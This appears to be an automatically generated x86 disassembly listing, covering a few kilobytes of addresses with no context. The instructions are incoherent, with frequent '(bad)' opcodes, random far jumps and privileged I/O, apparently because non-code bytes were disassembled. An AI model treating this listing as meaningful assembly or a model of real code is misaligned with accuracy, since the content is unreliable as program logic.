  447bef:	ins    BYTE PTR es:[edi],dx
  447bf0:	sbb    ch,cl
  447bf2:	jmp    0x1c16:0xb077
  447bf8:	sbb    esi,DWORD PTR [edi+eax*4+0x6c]
  447bfc:	mov    al,ds:0x8aa013b0
  447c01:	push   edi
  447c02:	sbb    al,0xf6
  447c05:	pop    eax
  447c06:	ins    DWORD PTR es:[edi],dx
  447c07:	pusha  
  447c08:	dec    edi
  447c09:	adc    BYTE PTR [ebp-0x6817b53c],bl
  447c0f:	(bad)  [esi+esi*1+0x6b820ab5]
  447c16:	and    bh,BYTE PTR ds:0x1201090a
  447c1c:	push   0xffffff92
  447c1e:	cmp    eax,0x10eab4da
  447c23:	pop    eax
  447c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447c25:	mov    ds:0x41ec0b4,al
  447c2a:	push   cs
  447c2b:	shl    DWORD PTR [eax+0x1e],cl
  447c2e:	loope  0x447bb6
  447c30:	shl    DWORD PTR [ecx],cl
  447c32:	or     BYTE PTR [esp+esi*8],bh
  447c35:	cdq    
  447c36:	add    al,dh
  447c38:	pop    ss
  447c39:	(bad)  
  447c3a:	sbb    ch,BYTE PTR [ebp-0x71]
  447c3d:	ret    0x4c47
  447c40:	or     BYTE PTR [esi+eax*8],al
  447c43:	dec    esi
  447c44:	and    eax,ecx
  447c46:	stos   BYTE PTR es:[edi],al
  447c47:	and    dl,cl
  447c49:	or     dh,al
  447c4b:	fldenv [esi-0x661e1934]
  447c51:	and    BYTE PTR [esi-0x27],bh
  447c54:	hlt    
  447c55:	cmp    al,0x8b
  447c57:	inc    eax
  447c58:	xor    eax,0xcc92ed1b
  447c5d:	out    dx,al
  447c5e:	lods   eax,DWORD PTR ds:[esi]
  447c5f:	mov    eax,0xb6688a5a
  447c64:	je     0x447ca4
  447c66:	jle    0x447cda
  447c68:	stos   BYTE PTR es:[edi],al
  447c69:	popa   
  447c6a:	loop   0x447c13
  447c6c:	shl    DWORD PTR [edi+0x48],1
  447c6f:	sub    ch,BYTE PTR [ebx-0x65a1cbb8]
  447c75:	jp     0x447cb5
  447c77:	xor    eax,0x2d1468e4
  447c7c:	popa   
  447c7d:	inc    edi
  447c7e:	adc    eax,0xf5926035
  447c83:	adc    bh,BYTE PTR [ecx]
  447c85:	iret   
  447c86:	push   ss
  447c87:	mov    ah,BYTE PTR [ecx+0x6ae99007]
  447c8d:	mov    esi,0xbb635ed0
  447c92:	sbb    dl,BYTE PTR [ecx-0x4313477e]
  447c98:	repnz sub al,0x58
  447c9b:	inc    esi
  447c9c:	jbe    0x447ca3
  447c9e:	std    
  447c9f:	mov    dl,0xe8
  447ca1:	inc    ebx
  447ca2:	jp     0x447d02
  447ca4:	stos   BYTE PTR es:[edi],al
  447ca5:	loop   0x447cfd
  447ca7:	and    eax,0x1eaad140
  447cac:	repnz imul eax,esp,0xf00a2bcc
  447cb3:	sbb    dl,BYTE PTR [edx]
  447cb5:	fcmovb st,st(7)
  447cb7:	adc    eax,0x9cc318e
  447cbc:	loop   0x447d38
  447cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447cbf:	pop    ds
  447cc0:	xchg   esp,eax
  447cc1:	push   ds
  447cc2:	inc    ebp
  447cc3:	jae    0x447d25
  447cc5:	scas   al,BYTE PTR es:[edi]
  447cc6:	dec    esp
  447cc7:	pop    es
  447cc8:	nop
  447cc9:	ds leave 
  447ccb:	push   esi
  447ccc:	aaa    
  447ccd:	push   ecx
  447cce:	pop    esi
  447ccf:	pop    eax
  447cd0:	inc    ebx
  447cd1:	dec    eax
  447cd2:	or     DWORD PTR cs:[ebx+ecx*2+0x52dd0a07],ebx
  447cda:	dec    edi
  447cdb:	inc    edx
  447cdc:	xor    esi,edi
  447cde:	mov    ch,0x1d
  447ce0:	fld    st(0)
  447ce2:	sahf   
  447ce3:	mov    bl,0x36
  447ce5:	mov    esi,0x8008a2e8
  447cea:	or     bh,al
  447cec:	xchg   BYTE PTR [esi],bh
  447cee:	xchg   edi,eax
  447cef:	push   eax
  447cf0:	add    BYTE PTR [ebp+0x58],bh
  447cf3:	popf   
  447cf4:	jle    0x447d5a
  447cf6:	jl     0x447ca6
  447cf8:	rol    BYTE PTR [ebx],cl
  447cfa:	push   ecx
  447cfb:	rol    BYTE PTR [edi+eiz*8-0x1ca90552],1
  447d02:	add    dl,BYTE PTR [esi+esi*1]
  447d05:	stos   DWORD PTR es:[edi],eax
  447d06:	dec    esi
  447d07:	jne    0x447ceb
  447d09:	xchg   esp,eax
  447d0a:	or     eax,0x26fc340f
  447d0f:	cmc    
  447d10:	dec    edx
  447d11:	out    0x75,al
  447d13:	mov    al,ds:0x4a86c63f
  447d18:	inc    edi
  447d19:	adc    BYTE PTR [edi],ch
  447d1b:	inc    eax
  447d1c:	aam    0x2
  447d1e:	mov    eax,ds:0xc0284064
  447d23:	mov    dh,0xf0
  447d25:	out    dx,al
  447d26:	mov    ss,WORD PTR [eax+edx*8-0x4]
  447d2a:	or     DWORD PTR [edx+0x6b],esp
  447d2d:	lods   eax,DWORD PTR ds:[esi]
  447d2e:	ins    BYTE PTR es:[edi],dx
  447d2f:	arpl   WORD PTR [esi-0x12],bx
  447d32:	shl    BYTE PTR [ecx-0x54],1
  447d35:	mov    ecx,0x6a8d9ef
  447d3a:	ds xchg esp,eax
  447d3c:	stos   BYTE PTR es:[edi],al
  447d3d:	ins    BYTE PTR es:[edi],dx
  447d3e:	ds xchg edi,eax
  447d40:	mov    cl,0x51
  447d42:	sar    dl,1
  447d44:	call   0x71ae02b
  447d49:	push   ds
  447d4a:	or     dl,ah
  447d4c:	dec    eax
  447d4d:	ror    BYTE PTR [edx-0x9],1
  447d50:	add    dh,BYTE PTR [edx+eiz*4-0x5211719a]
  447d57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447d58:	inc    esp
  447d59:	lods   al,BYTE PTR ds:[esi]
  447d5a:	and    eax,0x34019a6
  447d5f:	lods   eax,DWORD PTR ds:[esi]
  447d60:	push   ss
  447d61:	mov    esp,0x42b408fe
  447d66:	loope  0x447ddc
  447d68:	sbb    esp,ebp
  447d6a:	dec    ebp
  447d6b:	retf   0x3625
  447d6e:	fucomi st,st(4)
  447d70:	and    DWORD PTR [esi+ecx*8-0x72],0xd29b6416
  447d78:	fsub   st(0),st
  447d7a:	div    DWORD PTR ss:[esi+0x5a0612e8]
  447d81:	xchg   esi,eax
  447d82:	mov    WORD PTR [edx+0x39],gs
  447d85:	add    al,0xa8
  447d87:	inc    ecx
  447d88:	or     BYTE PTR [ecx+0x16],0xd0
  447d8c:	mov    BYTE PTR cs:[edi-0x2c],dl
  447d90:	daa    
  447d91:	enter  0xe0ab,0x3e
  447d95:	xchg   ebx,eax
  447d96:	in     eax,dx
  447d97:	lock sub eax,0x92d001e3
  447d9d:	jb     0x447da7
  447d9f:	adc    esi,DWORD PTR [esi]
  447da1:	push   ds
  447da2:	pop    eax
  447da3:	pop    eax
  447da4:	scas   al,BYTE PTR es:[edi]
  447da5:	mov    WORD PTR [ecx+0x20],gs
  447da8:	repz arpl WORD PTR [edx+0x1d],bx
  447dac:	add    BYTE PTR [esi+0x23dd2496],cl
  447db2:	arpl   WORD PTR [edi-0x7d],ax
  447db5:	jbe    0x447d67
  447db7:	rcr    DWORD PTR [eax],1
  447db9:	data16 fidivr WORD PTR [edx]
  447dbc:	loop   0x447d5f
  447dbe:	test   al,0xd7
  447dc0:	mov    esp,0xf87efe7a
  447dc5:	jp     0x447e45
  447dc7:	pop    eax
  447dc8:	clc    
  447dc9:	fs adc al,0xe
  447dcc:	add    DWORD PTR [ebx+edi*1+0x9],ebx
  447dd0:	xor    al,0xf0
  447dd2:	dec    ebx
  447dd3:	push   ss
  447dd4:	mov    al,ds:0xc382a995
  447dd9:	xchg   esp,eax
  447dda:	std    
  447ddb:	and    al,BYTE PTR [ecx-0x79edc583]
  447de1:	and    esp,DWORD PTR [ecx+0x4e6d6641]
  447de7:	popf   
  447de8:	repnz cmp al,0x2
  447deb:	fisub  DWORD PTR [esi-0x2c6523de]
  447df1:	push   0x17
  447df3:	mov    esi,0x148aa72a
  447df8:	das    
  447df9:	sub    BYTE PTR gs:[edx+0x5eb0ca06],cl
  447e00:	or     DWORD PTR [edi+0x56],0xa4606625
  447e07:	xlat   BYTE PTR ds:[ebx]
  447e08:	mov    bh,0x1b
  447e0a:	pop    edx
  447e0b:	cmp    esp,DWORD PTR [eax]
  447e0d:	pushf  
  447e0e:	jno    0x447e86
  447e10:	pop    es
  447e11:	mov    dl,0xf8
  447e13:	out    0x4,al
  447e15:	int3   
  447e16:	xchg   BYTE PTR [eax+eiz*2+0xb],dh
  447e1a:	sar    bh,0x83
  447e1d:	icebp  
  447e1e:	add    DWORD PTR [edx],ebp
  447e20:	or     al,BYTE PTR [edi+0x64fada3c]
  447e26:	xor    ecx,0x29
  447e29:	loop   0x447e4f
  447e2b:	mov    ebx,0xcd169b0a
  447e30:	xor    al,BYTE PTR [esi+0x42]
  447e33:	fist   WORD PTR [edx]
  447e35:	push   0xfffffff7
  447e37:	loopne 0x447dcc
  447e39:	test   DWORD PTR ds:0x84472096,ebx
  447e3f:	inc    esi
  447e40:	pop    ecx
  447e41:	push   0xffffffa0
  447e43:	jne    0x447eaa
  447e45:	xchg   esi,eax
  447e46:	test   DWORD PTR [esi+0x9],ebp
  447e49:	sbb    DWORD PTR [esi+0x49345b7d],esi
  447e4f:	retf   0x4cb0
  447e52:	or     ch,BYTE PTR [edi]
  447e54:	push   0x45
  447e56:	or     DWORD PTR [esi-0x7a],0x76
  447e5a:	loop   0x447e45
  447e5c:	cwde   
  447e5d:	pop    esi
  447e5e:	xor    al,0xf1
  447e60:	mov    BYTE PTR [edx+0x218c9678],0x5e
  447e67:	shl    ah,1
  447e69:	dec    eax
  447e6a:	ins    BYTE PTR es:[edi],dx
  447e6b:	fsub   st(2),st
  447e6d:	fs jmp 0x63ad:0x84b71611
  447e75:	push   ecx
  447e76:	dec    eax
  447e77:	test   BYTE PTR [esi+0x50be7af0],0x67
  447e7e:	test   BYTE PTR [ebp-0x25],ah
  447e81:	adc    DWORD PTR [edx],esp
  447e83:	and    edi,DWORD PTR [esi-0xfcbf366]
  447e89:	dec    eax
  447e8a:	shl    dh,cl
  447e8c:	mov    ds:0xb05074a6,al
  447e91:	push   ds
  447e92:	xor    dh,BYTE PTR [edx+0x1a]
  447e95:	xlat   BYTE PTR ds:[ebx]
  447e96:	add    BYTE PTR [ebx+ecx*8],dl
  447e99:	int3   
  447e9a:	xor    eax,0x80991259
  447e9f:	add    ch,BYTE PTR [esi+0x22]
  447ea2:	mov    bh,0x1e
  447ea4:	inc    ecx
  447ea5:	mov    dh,al
  447ea7:	pop    edx
  447ea8:	enter  0xe1a8,0xc2
  447eac:	rcl    BYTE PTR [esi+0xea4121f],1
  447eb2:	cmp    esi,DWORD PTR [eax-0x60]
  447eb5:	retf   
  447eb6:	popa   
  447eb7:	jp     0x447e93
  447eb9:	sbb    eax,0x8018974c
  447ebe:	rcl    DWORD PTR [esp+eiz*8+0x1e0a2020],0x63
  447ec6:	call   0xc9383154
  447ecb:	sub    bh,BYTE PTR [edi+0x57182ea4]
  447ed1:	inc    eax
  447ed2:	sbb    ah,BYTE PTR [esi]
  447ed4:	push   ebx
  447ed5:	push   eax
  447ed6:	shl    eax,1
  447ed8:	and    eax,0x9d90b45a
  447edd:	jae    0x447e67
  447edf:	test   eax,0x270ada12
  447ee4:	pushf  
  447ee5:	inc    esi
  447ee6:	jg     0x447f0b
  447ee8:	cli    
  447ee9:	pusha  
  447eea:	xor    BYTE PTR [ebp+0x41],0xd7
  447eee:	sub    al,0xfd
  447ef0:	ss dec edi
  447ef2:	fs push ecx
  447ef4:	ficomp DWORD PTR [edx+0x7e0a4a58]
  447efa:	jl     0x447ebe
  447efc:	das    
  447efd:	adc    edx,eax
  447eff:	and    al,0xe3
  447f01:	or     al,0x58
  447f03:	push   ds
  447f04:	and    al,0x24
  447f06:	mov    dh,0xb
  447f08:	push   eax
  447f09:	in     eax,dx
  447f0a:	sbb    bh,BYTE PTR ds:0xa45830d6
  447f10:	cs cmp eax,0xaf585fc
  447f16:	and    BYTE PTR [esi+eax*1+0x4bd4f28c],ah
  447f1d:	push   0xffffffd5
  447f1f:	pop    ebx
  447f20:	mov    ah,0x19
  447f22:	jb     0x447f06
  447f24:	cmp    al,0xfb
  447f26:	sbb    BYTE PTR [edx-0xa],ch
  447f29:	add    BYTE PTR [eax-0x2365e26a],ch
  447f2f:	sahf   
  447f30:	push   esi
  447f31:	loopne 0x447ec3
  447f33:	lods   al,BYTE PTR ds:[esi]
  447f34:	or     bh,BYTE PTR [ebx-0x4e]
  447f37:	or     al,0x90
  447f39:	and    eax,0x10f53022
  447f3e:	(bad)  
  447f3f:	retf   
  447f40:	inc    edi
  447f41:	sub    al,0x37
  447f43:	pop    esp
  447f44:	pop    ds
  447f45:	push   0xe35ebda1
  447f4a:	jl     0x447ed4
  447f4c:	push   0xda11b02a
  447f51:	add    edx,DWORD PTR [ecx]
  447f53:	or     eax,0x1de449c2
  447f58:	sub    al,0x4c
  447f5a:	ret    0x88b2
  447f5d:	xlat   BYTE PTR ds:[ebx]
  447f5e:	adc    al,0x58
  447f60:	sub    DWORD PTR [edx],edx
  447f62:	call   0x9c79:0x2c7acba1
  447f69:	mov    cl,0x8c
  447f6b:	shr    BYTE PTR [ebx-0x2babfabc],1
  447f71:	out    dx,al
  447f72:	leave  
  447f73:	and    BYTE PTR ds:0xb6aadcec,ch
  447f79:	jmp    0xb790:0x48b35a58
  447f80:	(bad)  
  447f81:	call   DWORD PTR [ebp+eiz*1-0xc]
  447f85:	mov    al,0x88
  447f87:	add    al,0xb9
  447f89:	jns    0x447fcc
  447f8b:	add    al,0xec
  447f8d:	add    esp,DWORD PTR [edi+ebp*4-0x7b623ae]
  447f94:	ins    DWORD PTR es:[edi],dx
  447f95:	mov    ds:0x1b0c9b06,eax
  447f9a:	mov    ecx,0xb8496a0
  447f9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447fa0:	pop    eax
  447fa1:	sahf   
  447fa2:	lds    esp,FWORD PTR [ebx]
  447fa4:	or     DWORD PTR [eax+0x18],ebx
  447fa7:	sub    BYTE PTR [esi],al
  447fa9:	push   0xfffffff6
  447fab:	push   esi
  447fac:	inc    eax
  447fad:	add    dl,al
  447faf:	mov    ds:0x1a77940a,al
  447fb4:	adc    edx,DWORD PTR [ebx]
  447fb6:	ins    BYTE PTR es:[edi],dx
  447fb7:	lahf   
  447fb8:	add    BYTE PTR [esi],bl
  447fba:	add    BYTE PTR [edx],ch
  447fbc:	popa   
  447fbd:	hlt    
  447fbe:	and    al,0xb2
  447fc0:	push   ebp
  447fc1:	repnz pushf 
  447fc3:	ss ds dec ebp
  447fc6:	loopne 0x448013
  447fc8:	retf   0x191c
  447fcb:	popf   
  447fcc:	mov    dl,0x68
  447fce:	ror    DWORD PTR [eax+0x1aa83539],1
  447fd4:	add    BYTE PTR [ebx+ebx*1],ch
  447fd7:	lock mov WORD PTR [eax-0x4b5a56ed],fs
  447fde:	mov    esi,0xda987727
  447fe3:	dec    ecx
  447fe4:	lods   eax,DWORD PTR ds:[esi]
  447fe5:	push   ebx
  447fe6:	push   eax
  447fe7:	sti    
  447fe8:	aam    0x83
  447fea:	fsub   st(6),st
  447fec:	(bad)  
  447fed:	mov    ds:0xafd263da,al
  447ff2:	jge    0x447fac
  447ff4:	jnp    0x447ffe
  447ff6:	xor    edx,DWORD PTR [esp+eiz*2-0x51]
  447ffa:	and    al,0xec
  447ffc:	xor    BYTE PTR [eax-0x59519702],ah
  448002:	loop   0x447f8e
  448004:	inc    eax
  448005:	sub    dh,dl
  448007:	adc    al,0x22
  448009:	fild   WORD PTR [ebp*2+0x4e21d247]
  448010:	xchg   BYTE PTR [edi],al
  448012:	inc    esi
  448013:	adc    al,0xdb
  448015:	mov    eax,ds:0x209e9a2a
  44801a:	dec    esi
  44801b:	lods   al,BYTE PTR ds:[esi]
  44801c:	xchg   ebp,eax
  44801d:	cmp    ch,BYTE PTR [ebx]
  44801f:	mov    fs,WORD PTR [edx+0xb]
  448022:	pop    DWORD PTR [eax+0x3d]
  448025:	out    0x6d,al
  448027:	mov    al,0x9
  448029:	push   0x73
  44802b:	sbb    cl,ah
  44802d:	jo     0x448062
  44802f:	pop    edi
  448030:	(bad)  
  448031:	cmovb  ebp,DWORD PTR [eax+0x57]
  448035:	push   0x1a7582e
  44803a:	mov    ah,0x8e
  44803c:	lahf   
  44803d:	add    ah,BYTE PTR [esi-0x55]
  448040:	sub    ah,BYTE PTR [esi+0x47b61470]
  448046:	adc    DWORD PTR [edi-0x9e3b0ea],ebp
  44804c:	push   cs
  44804d:	mov    al,ds:0x6d8d5738
  448052:	rcl    ah,0xfa
  448055:	js     0x448091
  448057:	mov    edi,0x18855033
  44805c:	or     eax,0xbe0a2274
  448061:	das    
  448062:	call   0xb9dc:0x7c199a3a
  448069:	pop    edx
  44806a:	and    DWORD PTR [esi+edi*2+0x0],0x68
  44806f:	and    al,0xd1
  448071:	or     dh,BYTE PTR [edx+esi*1+0x1002f172]
  448078:	ds ret 0x4d30
  44807c:	lods   al,BYTE PTR ds:[esi]
  44807d:	lock lods al,BYTE PTR ds:[esi]
  44807f:	pushf  
  448080:	(bad)  
  448081:	daa    
  448082:	rcr    BYTE PTR [edx-0x7f],1
  448085:	in     al,0xd4
  448087:	mov    ah,0xa0
  448089:	inc    edi
  44808a:	adc    edi,DWORD PTR [ebx]
  44808c:	mov    ah,0xbd
  44808e:	and    eax,0xc211f9d6
  448093:	push   cs
  448094:	add    eax,0x9d5b84d2
  448099:	push   0xfffffff8
  44809b:	mov    al,0xf0
  44809d:	sbb    ch,BYTE PTR [edx-0x31b61f41]
  4480a3:	icebp  
  4480a4:	cs inc eax
  4480a6:	ins    BYTE PTR es:[edi],dx
  4480a7:	push   0x294afad6
  4480ac:	add    esp,DWORD PTR [edx+0x30]
  4480af:	or     al,0x3d
  4480b1:	adc    DWORD PTR [ebx+0x76696114],edi
  4480b7:	or     al,BYTE PTR cs:[esi]
  4480ba:	pop    edx
  4480bb:	xor    eax,0x48e8ffd2
  4480c0:	sub    BYTE PTR [edx+ecx*2+0x541e64e1],dh
  4480c7:	sub    dl,BYTE PTR [ebp+eiz*4-0x7a1ede06]
  4480ce:	sub    BYTE PTR [ebp+0x7d],0xb2
  4480d2:	inc    ecx
  4480d4:	mov    dh,0x56
  4480d6:	pop    esp
  4480d7:	fnstenv [edx]
  4480d9:	add    al,0x5e
  4480db:	lods   eax,DWORD PTR ds:[esi]
  4480dc:	pop    edi
  4480dd:	test   al,0x4b
  4480df:	bound  edi,QWORD PTR [ebx-0x257d7968]
  4480e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4480e6:	xchg   BYTE PTR [eax+edx*1],bh
  4480e9:	(bad)  [ebx]
  4480eb:	call   0x9a46:0xa7008b5a
  4480f2:	cli    
  4480f3:	push   ebx
  4480f4:	and    BYTE PTR [esi],dh
  4480f6:	pop    esi
  4480f7:	ror    BYTE PTR [eax-0x2ceda391],1
  4480fd:	add    ecx,ecx
  4480ff:	dec    esp
  448100:	jae    0x448144
  448102:	add    al,dh
  448104:	sub    eax,0x840a5432
  448109:	push   es
  44810a:	dec    ebx
  44810b:	pushf  
  44810c:	mov    ds:0x4a0e2140,al
  448111:	inc    edi
  448112:	nop
  448113:	int3   
  448114:	pop    ecx
  448115:	push   0x8081d0ca
  44811a:	daa    
  44811b:	or     ch,0x21
  44811e:	and    DWORD PTR ds:[edx+0x52ce6bce],esp
  448125:	mov    WORD PTR ds:0x34414d02,es
  44812b:	mov    ah,0x68
  44812d:	shl    BYTE PTR [edi+eiz*1],cl
  448130:	mov    WORD PTR [esi+0xe],?
  448133:	mov    eax,0x22b8b9fa
  448138:	sub    DWORD PTR [edx+0x34562647],esi
  44813e:	call   0xba85f9bd
  448143:	pop    eax
  448144:	xchg   esi,eax
  448145:	rol    BYTE PTR [edx+0x3e5c6ed3],0xb
  44814c:	ret    0x2666
  44814f:	inc    esi
  448150:	pop    ebx
  448151:	push   esi
  448152:	jo     0x44817a
  448154:	sub    al,dl
  448156:	mov    cl,0xa8
  448158:	int    0x46
  44815a:	pop    eax
  44815b:	inc    edi
  44815c:	cmpxchg BYTE PTR [eax],ah
  44815f:	sar    DWORD PTR [eax+0x43],1
  448162:	lds    edi,FWORD PTR [esi+eax*1-0x7e]
  448166:	pop    ss
  448167:	sbb    DWORD PTR [ecx+0x15],ecx
  44816a:	inc    edx
  44816b:	data16 fsub st(4),st
  44816e:	cdq    
  44816f:	jno    0x448171
  448171:	pop    edx
  448172:	jnp    0x448134
  448174:	xchg   ch,ah
  448176:	repnz loopne 0x44812f
  448179:	in     al,0xc7
  44817b:	xchg   esp,eax
  44817c:	mov    ch,0x76
  44817e:	and    DWORD PTR ds:0xfad058d3,edi
  448184:	test   DWORD PTR [eax+0x270c014c],edx
  44818a:	mov    ebx,0xa0b096d7
  44818f:	shr    ebp,0x0
  448192:	cmp    ecx,DWORD PTR [edx+0x35]
  448195:	xor    eax,0x67853927
  44819a:	dec    eax
  44819b:	mov    edx,0xfa5dc890
  4481a0:	and    BYTE PTR [ecx+0x686d99f4],dh
  4481a6:	cmc    
  4481a7:	and    BYTE PTR [edx+0xd],dl
  4481aa:	jl     0x4481ee
  4481ac:	push   0xffffffa0
  4481ae:	fnstcw WORD PTR [edi+ebp*1+0x29b407e1]
  4481b5:	pop    esp
  4481b6:	cmp    ah,cl
  4481b8:	pop    esi
  4481b9:	jl     0x4481b7
  4481bb:	xchg   DWORD PTR [esi],edi
  4481bd:	inc    eax
  4481be:	pop    DWORD PTR [ecx+0x58]
  4481c1:	push   edx
  4481c2:	adc    eax,0x14e1021e
  4481c7:	or     DWORD PTR [edi-0x7a],0xa3641706
  4481ce:	xchg   ebx,eax
  4481cf:	stos   BYTE PTR es:[edi],al
  4481d0:	cmp    dl,ah
  4481d2:	jo     0x44818e
  4481d4:	push   eax
  4481d5:	push   esp
  4481d6:	dec    esp
  4481d7:	neg    dl
  4481d9:	clc    
  4481da:	push   0x36f43f54
  4481df:	gs fwait
  4481e1:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4481e3:	in     al,dx
  4481e4:	and    eax,DWORD PTR [edx+ebx*1+0x6a5332ec]
  4481eb:	test   eax,0x860d1027
  4481f0:	push   ecx
  4481f1:	xchg   BYTE PTR [esp+esi*8+0x7e0a1003],ch
  4481f8:	mov    ah,0xd8
  4481fa:	mov    eax,0xfd6df8d3
  4481ff:	xor    al,0x66
  448201:	dec    esi
  448202:	sti    
  448203:	mov    dl,0x63
  448205:	ret    0xb2d6
  448208:	ds rcl esi,0xd
  44820c:	arpl   WORD PTR [eax-0x20],dx
  44820f:	pop    ss
  448210:	and    DWORD PTR [eax-0x98cedf8],ebx
  448216:	aam    0xa
  448218:	inc    edx
  448219:	inc    ebx
  44821a:	xchg   esi,eax
  44821b:	xchg   esp,eax
  44821c:	and    esi,DWORD PTR [ecx+0x17]
  44821f:	add    BYTE PTR [eax],cl
  448221:	xchg   dl,dl
  448223:	stos   BYTE PTR es:[edi],al
  448224:	pusha  
  448225:	mov    WORD PTR [edi+0x3ed1c341],gs
  44822b:	mov    esi,ds
  44822d:	into   
  44822e:	out    dx,al
  44822f:	adc    al,0xb4
  448231:	dec    esi
  448232:	lods   eax,DWORD PTR ds:[esi]
  448233:	push   esi
  448234:	les    edi,FWORD PTR [ecx]
  448236:	call   0x4250:0x839600eb
  44823d:	bound  edi,QWORD PTR [esi-0x17d25234]
  448243:	xor    BYTE PTR [eax],al
  448245:	nop
  448246:	push   0xca2c8ac0
  44824b:	xchg   esp,eax
  44824c:	jbe    0x448225
  44824e:	inc    edx
  44824f:	adc    bl,BYTE PTR [esi]
  448251:	sbb    DWORD PTR [eax+0x1a],eax
  448254:	(bad)  [eax+0xb]
  448257:	push   0xffffffe3
  448259:	lods   eax,DWORD PTR ds:[esi]
  44825b:	sub    al,BYTE PTR [edi+0x316b4560]
  448261:	sbb    al,0x58
  448263:	push   es
  448264:	inc    esi
  448265:	or     esp,esi
  448267:	fisub  WORD PTR [eax+0x7e]
  44826a:	add    al,ch
  44826c:	inc    edx
  44826d:	mov    ebp,0x8e72aa72
  448272:	push   es
  448273:	xor    dl,BYTE PTR [ecx]
  448275:	pop    edi
  448276:	nop
  448277:	jmp    0x89ad:0x364703a
  44827e:	nop
  44827f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448280:	hlt    
  448281:	jp     0x4482f2
  448283:	mov    cl,BYTE PTR [eax+edi*8]
  448286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448287:	popf   
  448288:	mov    eax,ds:0x2961b03c
  44828d:	add    BYTE PTR [edx],cl
  44828f:	je     0x4482e1
  448291:	lea    esp,[edi+0x41]
  448294:	pusha  
  448295:	xor    ecx,DWORD PTR [edi+edi*8+0x1257a1a5]
  44829c:	out    0x49,al
  44829e:	push   esp
  44829f:	add    al,0x54
  4482a1:	test   al,0xa8
  4482a3:	cli    
  4482a4:	pminsw mm0,QWORD PTR [eax]
  4482a7:	mov    edi,0x9afa6b36
  4482ac:	or     cl,BYTE PTR [edx]
  4482ae:	mov    ebx,DWORD PTR [eax+edx*4-0x46]
  4482b2:	cmp    BYTE PTR [eax],dl
  4482b4:	pusha  
  4482b5:	pop    edi
  4482b6:	nop
  4482b7:	mov    dh,0x7
  4482b9:	(bad)  
  4482ba:	jp     0x4482aa
  4482bc:	add    eax,0x952478b0
  4482c1:	mov    WORD PTR [esi],cs
  4482c3:	sbb    BYTE PTR [eax+0x60784af7],dl
  4482c9:	imul   eax,ecx,0xffffff90
  4482cc:	ins    BYTE PTR es:[edi],dx
  4482cd:	xlat   BYTE PTR ds:[ebx]
  4482ce:	mov    esp,edx
  4482d0:	adc    BYTE PTR [edi+0x5f058127],al
  4482d6:	cmp    al,0x79
  4482d8:	test   BYTE PTR [ebp+0x11],dh
  4482db:	clc    
  4482dc:	js     0x4482eb
  4482de:	imul   edx,ecx,0xfffffff6
  4482e1:	out    0x56,al
  4482e3:	mov    ch,0x4e
  4482e5:	push   edx
  4482e6:	in     eax,dx
  4482e7:	add    DWORD PTR [ecx],0x6f
  4482ea:	dec    ebx
  4482eb:	ret    
  4482ec:	bound  esi,QWORD PTR [ebp-0x71cbabfc]
  4482f2:	retf   0x5d76
  4482f5:	pop    edx
  4482f6:	pop    es
  4482f7:	xor    al,0x3a
  4482f9:	or     BYTE PTR [eax],dh
  4482fb:	and    BYTE PTR [esi+0x3],al
  4482fe:	or     eax,0x62a937ec
  448303:	jbe    0x44837f
  448305:	inc    ecx
  448306:	mov    esi,0x8559e2a
  44830b:	test   al,0x16
  44830d:	icebp  
  44830e:	data16 shl BYTE PTR [edx-0x19],0x7
  448313:	adc    cl,ch
  448315:	xor    ah,BYTE PTR [ebx+ecx*8+0x6a]
  448319:	aad    0x4
  44831b:	mov    DWORD PTR [ebp-0x6438b48],ecx
  448321:	vpshlb ymm11,xmm0,[edx]
  448326:	sub    dh,dl
  448328:	cld    
  448329:	ss push edi
  44832b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44832c:	push   ss
  44832d:	jl     0x448389
  44832f:	into   
  448330:	xor    al,0x60
  448332:	scas   al,BYTE PTR es:[edi]
  448333:	rcl    BYTE PTR [eax-0x7f],0x2d
  448337:	mov    eax,0x9f7ee07c
  44833c:	sub    edi,DWORD PTR [eax+0x14e65748]
  448342:	aam    0x14
  448344:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448345:	pop    esi
  448346:	not    BYTE PTR [esp+eiz*2]
  448349:	mov    eax,0xf3a93aa2
  44834e:	jmp    0x7242:0xac3f08f3
  448355:	fld    TBYTE PTR [esp+eax*8+0x3e]
  448359:	lods   al,BYTE PTR ds:[esi]
  44835a:	add    ecx,DWORD PTR [ebx]
  44835c:	fnsave [esi]
  44835e:	xor    BYTE PTR [esi-0x2],dh
  448361:	dec    edi
  448362:	and    al,dl
  448364:	or     ecx,0x3ede8c58
  44836a:	or     al,0xa1
  44836c:	or     esi,DWORD PTR [edx+0x35a270d9]
  448372:	mov    ebp,DWORD PTR [eax]
  448374:	adc    dh,BYTE PTR [ebp+0x62]
  448377:	inc    edx
  448378:	fcomp  QWORD PTR [edx-0x4b]
  44837b:	rol    BYTE PTR [esp+edi*1],1
  44837e:	stos   BYTE PTR es:[edi],al
  44837f:	and    al,0x12
  448381:	push   esi
  448382:	out    0x5,al
  448384:	xor    al,0x5a
  448386:	aad    0x78
  448388:	add    BYTE PTR [ebp+0x4ee0552],al
  44838e:	push   edx
  44838f:	stos   DWORD PTR es:[edi],eax
  448390:	ss pusha 
  448392:	lods   al,BYTE PTR ds:[esi]
  448393:	pop    esi
  448394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448395:	and    bl,BYTE PTR [ebx+eax*1-0x7b]
  448399:	test   bl,0x1e
  44839c:	mov    bh,dh
  44839e:	shr    BYTE PTR [esp+edx*1+0x1f],1
  4483a2:	les    ecx,FWORD PTR [edi]
  4483a4:	jmp    0x448338
  4483a6:	push   esi
  4483a7:	les    esp,FWORD PTR [eax-0x4075ff18]
  4483ad:	and    DWORD PTR [edx+0x42],0x28dad4a8
  4483b4:	push   esp
  4483b5:	or     dh,al
  4483b7:	xchg   BYTE PTR [esi],cl
  4483b9:	repz sbb edx,DWORD PTR [edx-0x2f293396]
  4483c0:	mov    esp,0xfee2e0e1
  4483c5:	push   edi
  4483c6:	pop    ebp
